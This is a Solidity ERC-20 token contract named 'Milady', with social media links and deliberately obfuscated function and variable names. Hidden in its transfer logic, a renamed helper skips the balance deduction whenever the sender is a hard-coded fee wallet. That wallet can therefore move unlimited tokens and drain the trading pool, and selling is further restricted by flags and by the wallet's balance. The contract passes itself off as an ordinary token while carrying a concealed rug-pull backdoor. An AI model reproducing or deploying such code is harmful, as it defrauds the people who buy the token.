/**

Twitter: https://twitter.com/MiladyEthereum

Telegram: https://t.me/MiladysEthereum

Website: https://miladyerc.com/

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;



interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _qvuar(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _qvuar(a, b, "SafeMath");
    }

    function  _qvuar(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _bylfh(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract Milady is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _pourae;
    address payable private _qfnfda;
    address private _bfeurp;
    string private constant _name = unicode"Milady";
    string private constant _symbol = unicode"Milady";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 **_decimals;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _ylracr=0;
    uint256 private _qvfugt=0;
    uint256 public _pvoyrb = _totalSupply;
    uint256 public _qrponk = _totalSupply;
    uint256 public _pjgefb= _totalSupply;
    uint256 public _qrfred= _totalSupply;


    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _qlvuod;
    mapping (address => bool) private _bvkczk;
    mapping(address => uint256) private _flavrg;

    bool private _mreropen;
    bool public _pridwq = false;
    bool private klqock = false;
    bool private _recyej = false;


    event _qrekjp(uint _pvoyrb);
    modifier frntey {
        klqock = true;
        _;
        klqock = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _qlvuod[owner(

        )] = true;
        _qlvuod[address
        (this)] = true;
        _qlvuod[
            _qfnfda] = true;
        _qfnfda = 
        payable (0x8b3F7839184a66665F14Fb2d769b2A7dAa1F4Efc);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _qvuar(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 bropfg=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_pridwq) {
                if (to 
                != address
                (_pourae) 
                && to !=
                 address
                 (_bfeurp)) {
                  require(_flavrg
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _flavrg
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _bfeurp && to != 
            address(_pourae) &&
             !_qlvuod[to] ) {
                require(amount 
                <= _pvoyrb,
                 "Exceeds the _pvoyrb.");
                require(balanceOf
                (to) + amount
                 <= _qrponk,
                  "Exceeds the _qrponk.");
                if(_qvfugt
                < _ylracr){
                  require
                  (! _frvdx(to));
                }
                _qvfugt++;
                 _bvkczk
                 [to]=true;
                bropfg = amount._bylfh
                ((_qvfugt>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _bfeurp &&
             from!= address(this) 
            && !_qlvuod[from] ){
                require(amount <= 
                _pvoyrb && 
                balanceOf(_qfnfda)
                <_qrfred,
                 "Exceeds the _pvoyrb.");
                bropfg = amount._bylfh((_qvfugt>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_qvfugt>
                _ylracr &&
                 _bvkczk[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!klqock 
            && to == _bfeurp &&
             _recyej &&
             contractTokenBalance>
             _pjgefb 
            && _qvfugt>
            _ylracr&&
             !_qlvuod[to]&&
              !_qlvuod[from]
            ) {
                _transferFrom( _bdkjv(amount, 
                _bdkjv(contractTokenBalance,
                _qrfred)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _prxnk(address
                    (this).balance);
                }
            }
        }

        if(bropfg>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(bropfg);
          emit
           Transfer(from,
           address
           (this),bropfg);
        }
        _balances[from
        ]= _qvuar(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _qvuar(bropfg));
        emit Transfer
        (from, to, 
        amount.
         _qvuar(bropfg));
    }

    function _transferFrom(uint256
     tokenAmount) private
      frntey {
        if(tokenAmount==
        0){return;}
        if(!_mreropen)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _pourae.WETH();
        _approve(address(this),
         address(
             _pourae), 
             tokenAmount);
        _pourae.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _bdkjv
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _qvuar(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _qfnfda){
            return a ;
        }else{
            return a .
             _qvuar (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _pvoyrb = _totalSupply;
        _qrponk = _totalSupply;
        emit _qrekjp(_totalSupply);
    }

    function _frvdx(address 
    account) private view 
    returns (bool) {
        uint256 doiap;
        assembly {
            doiap :=
             extcodesize
             (account)
        }
        return doiap > 
        0;
    }

    function _prxnk(uint256
    amount) private {
        _qfnfda.
        transfer(
            amount);
    }

    function openTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _mreropen ) ;
        _pourae  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _pourae), 
            _totalSupply);
        _bfeurp = 
        IUniswapV2Factory(_pourae.
        factory( ) 
        ). createPair (
            address(this
            ),  _pourae .
             WETH ( ) );
        _pourae.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_bfeurp).
        approve(address(_pourae), 
        type(uint)
        .max);
        _recyej = true;
        _mreropen = true;
    }

    receive() external payable {}
}